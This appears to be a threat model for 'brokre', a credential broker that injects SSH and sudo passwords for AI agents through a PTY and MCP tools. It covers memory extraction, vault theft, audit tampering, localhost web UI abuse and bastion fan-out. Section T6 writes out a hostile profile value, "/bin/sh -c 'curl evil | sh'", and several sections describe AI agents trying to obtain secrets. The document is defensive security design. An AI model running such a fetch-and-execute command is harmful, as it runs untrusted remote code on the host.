# Threat Model

## T1: AI agent extracts secrets from memory

- **Attack**: AI reads `brokre` process memory to extract decrypted secrets (or root dumps core / uses `process_vm_readv`).
- **Mitigation (Unix, saved records)**: The long-lived parent **does not** call `decrypt_for_exec` for `exec`. A short-lived `brokre --internal-injector` child loads the vault record, decrypts once, writes the password + `\r` to the PTY master fd, then exits. Parent memory still holds ciphertext and metadata only. `SecretString` / `SecretBytes` continue to zeroize on drop; Linux additionally attempts `mlockall`, clears dumpable, disables core files, and refuses startup when `TracerPid != 0` (release / enforce mode). macOS disables core dumps and calls `PT_DENY_ATTACH` (traced-state sysctl is not wired through `libc` here).
- **Mitigation (tests / `in_proc_inject`)**: `PtyCredential::Secret` keeps the previous in-process path for integration tests and optional builds (`in_proc_inject` is **on by default**; use `cargo build --no-default-features` to drop it).
- **Residual risk**: Root-level memory dumps can still capture plaintext **inside the injector child** for milliseconds. Parent process no longer retains decrypted vault passwords for the whole SSH session.

## T2: AI calls `brokre reveal` programmatically

- **Attack**: AI tries to call `brokre reveal` to get plaintext.
- **Mitigation**: `reveal` requires `stdin_is_real_tty()` + passphrase. AI processes typically lack a real TTY.
- **Residual risk**: None (if TTY check is reliable).

## T3: Attacker reads vault file from disk

- **Attack**: Attacker copies `~/.brokre/vault/store.jsonl.enc`.
- **Mitigation**: Field payloads are encrypted with AES-256-GCM. DEK is wrapped with `master_kek` (OS keyring on Linux; file-backed `~/.brokre/.master_kek` on macOS by default) and `reveal_kek` (Argon2id). Attacker needs vault file + KEK material + reveal passphrase (when set).
- **Residual risk**: **Plaintext metadata** in each JSONL line is not inside the ciphertext: `profile`, `name`, `labels`, `host_alias`, `saved_args`, timestamps, etc. A disk thief learns connection targets and replay argv without decrypting fields. On macOS, stealing `~/.brokre/.master_kek` alone enables `exec` (not `reveal` if a reveal passphrase was set).

## T4: Tempfile race condition

- **Attack**: Attacker reads tempfile between creation and spawn.
- **Mitigation**: Tempfiles are created in `~/.brokre/run/` (0700), chmod 0600, and unlinked immediately after spawn. Subprocess retains fd.
- **Residual risk**: On multi-user systems with shared `/tmp` (not used by brokre) there would be risk; brokre uses `~/.brokre/run/`.

## T5: Ephemeral ssh-agent残留

- **Attack**: `ssh-agent` survives brokre crash; next process reuses socket.
- **Mitigation**: Socket path includes UUID + parent PID. Startup scrubs stale sockets. Linux uses `prctl(PR_SET_PDEATHSIG)`.
- **Residual risk**: `SIGKILL` of parent prevents cleanup; scrub on startup mitigates.

## T6: Malicious profile executes arbitrary commands

- **Attack**: User loads a profile with `binary = "/bin/sh -c 'curl evil | sh'"`.
- **Status (0.1.x)**: Custom TOML profiles under `~/.brokre/profiles/` are **not loaded yet** (roadmap). Built-in connectors resolve binaries via `which` only.
- **Planned mitigation**: Binary path validation (no shell metacharacters), TTY trust on first load, profile files mode 0600.
- **Residual risk**: User can invoke arbitrary binaries via `brokre exec` today; treat saved `saved_args` metadata as sensitive.

## T7: Audit log tampering

- **Attack**: Attacker modifies `~/.brokre/audit/audit.log`.
- **Mitigation**: HMAC chain keyed like `master_kek`. New events use **HMAC v2** (canonical JSON over `name`, redacted args, hardening, injector fields). Legacy v1 events (timestamp/action/profile/exit only) still verify. `brokre audit verify` detects broken chains or bad MACs.
- **Residual risk**: Attacker with `audit_hmac_key` can forge plausible lines. Upgrade from pre-v2 logs: back up or truncate `audit.log` if you need uniform v2 semantics.

## T8: Secret leakage via audit log

- **Attack**: Audit log accidentally contains plaintext secrets.
- **Mitigation**: Audit argv preserves command structure; values after password flags (`-p`, `--password`, …), PEM material, and env password vars are replaced with `<REDACTED>`. Vault passwords are injected via PTY and are not part of argv. `reveal` never logs field values; `rm` logs `rm/success` or `rm/denied` only.
- **Residual risk**: Metadata (`profile`, `name`, `host_alias`) remains visible by design.

## T9: Cross-platform downgrade

- **Attack**: Windows version has weaker security guarantees than Unix.
- **Mitigation**: Windows uses Credential Manager + ACL-only-current-user + FILE_FLAG_DELETE_ON_CLOSE. Experimental features are clearly marked.
- **Residual risk**: SSH agent bridge on Windows depends on OpenSSH-Win32 and may not fully match Unix security.

## T10: Local manage web UI

- **Attack**: Malicious site or AI agent calls `http://127.0.0.1:<port>/reveal` or CSRF-writes credentials.
- **Mitigation**: No reveal/export endpoint; passwords never appear in HTTP responses. Server binds loopback only. Write APIs require `Authorization: Bearer <session_token>`. Delete/rotate require reveal passphrase verification; literal `YES` is accepted only when `reveal_protected == false` (auto-saved records). Bastion key setup/rotation uses `POST /api/bastion/set-key` (write auth only; Argon2id verifier, clears active unlock session). Embedded MCP manage omits session tokens from stderr; idle timeout marks the Manage UI session expired (general auth rejected). Bastion gate unlock/status may still use the same token after idle expiry, but a successful bastion unlock does not revive the general Manage API session. Standalone `brokre manage` prints the full URL only to a human terminal.
- **Residual risk**: Browser extensions or local malware on the same host can attempt localhost requests while `brokre manage` is running and the session is active. `brokre reveal` remains TTY-gated (T2) and is not exposed via HTTP.

## T11: MCP server exposes secrets to AI

- **Attack**: AI calls MCP tools to list passwords, export session tokens, or invoke `reveal`.
- **Mitigation**: MCP exposes only `brokre_list` (metadata), `brokre_exec` / `brokre_exec_elevated` (subprocess or in-process elevated PTY with piped I/O), read-only audit tools, and `brokre_setup` (opens browser; tool response contains no session token). `reveal` and `rm` are not MCP tools. Embedded manage omits tokens from logs; `brokre` npm launcher redacts `?t=` on stderr. Idle manage sessions expire (auth rejected) without killing MCP.
- **Residual risk**: `brokre_exec` stdout/stderr may contain remote command output chosen by the agent; that is intentional. First-time unsaved connections still require human TTY via manage UI, not MCP.

## T12: MCP persistent elevated PTY sessions

- **Attack**: Local malware or a compromised `brokre mcp` process reuses an open root shell; attacker reads PTY output or injects commands between AI invocations.
- **Mitigation**: Sessions live only inside the MCP process (never returned to the agent). Password injection still uses short-lived injector children (T1). Default idle timeout 10 minutes, max lifetime 30 minutes, background sweeper, and full pool teardown when MCP exits. `session=close` ends a session early; `BROKRE_MCP_SESSION=0` disables reuse. Each `run` is audit-logged (`mcp/elevated-session/*`).
- **Residual risk**: A persistent root shell increases blast radius if the local brokre process is compromised while a session is active. Sudo password is still assumed to match the vault `password` field. True interactive TTY programs (`vim`, bare `sudo -i` without a command) remain unsupported over MCP.

## T13: Bastion route amplification (SSH fan-out)

- **Attack**: AI or script triggers `brokre list --probe --include-bastions` or many routed execs, opening concurrent SSH/TCP probes through one or more bastions and overwhelming target `sshd` or bastion CPU.
- **Mitigation**: TCP probes use ms-level timeouts, concurrency semaphores, and short result caches. Bastion outbound requires a human-unlocked TTL session when a bastion key is configured. Registered bastion count and hop depth are capped (`BROKRE_BASTION_MAX`, `BROKRE_BASTION_MAX_DEPTH`). Loop detection via `BROKRE_BASTION_PATH`.
- **Residual risk**: A unlocked session still allows the local MCP/CLI owner to fan out until idle timeout; operators should keep TTL short and monitor audit (`bastion/*`, `source=bastion`).

## T14: Bastion unlock bypass / session forgery

- **Attack**: Malware writes a fake `~/.brokre/run/bastion_session.json` or calls unlock APIs without knowing the bastion key.
- **Mitigation**: Session file mode 0600; only manage `POST /api/bastion/unlock` (Bearer session token + Argon2id verifier), `POST /api/bastion/set-key` (Bearer write auth + Argon2id verifier), or TTY `brokre bastion unlock` / `brokre bastion set-key` create or rotate keys and sessions. MCP uses URL-mode elicitation (sensitive key never in MCP client) or localhost browser + status polling. Gate unlock/status remain available after embedded manage idle expiry so MCP/CLI unlock flows keep working, but they do not re-enable general Manage API auth. Unlock/deny/set-key events are audit-logged (HMAC v4 with `bastion` field).
- **Residual risk**: Root on the laptop can still patch brokre or replace the binary; bastion gate is a human intent latch, not anti-root.

## T15: SessionRelay tunnel agent misuse

- **Attack**: A local user or AI process runs routed SSH through a registered bastion, which starts `brokre tunnel agent --stdio` by default, then attempts routed SSH fan-out through aliases such as `b150::db`.
- **Mitigation**: Phase 1 agents are started only over an authenticated SSH session to the bastion and still require bastion gate unlock when configured. The agent executes `brokre ssh <inner>` on the bastion, so inner credentials remain in the bastion vault and are injected by the short-lived injector path there. The protocol is single-session over SSH stdio; no TCP listener or persistent daemon is exposed in Phase 1. `tunnel_exec` audit events record route metadata, bastion, exit code, and duration, not terminal payload.
- **Residual risk**: An unlocked bastion session permits the local account to open SessionRelay sessions until idle expiry. A compromised bastion can still use its local vault and network position for lateral movement; SessionRelay does not make that worse, but it introduces agent parsing and PTY relay code into the default routed SSH path. `BROKRE_TUNNEL=0` remains a temporary legacy escape hatch for emergency rollback.

## Future Work

- **Custom TOML profiles**: Load `~/.brokre/profiles/*.toml` with path validation and TTY trust (see README roadmap).
- **HostBook v2**: DRY host configuration for 50+ homogeneous hosts.
- **Agent token**: Short-lived tokens for CI/CD integration.
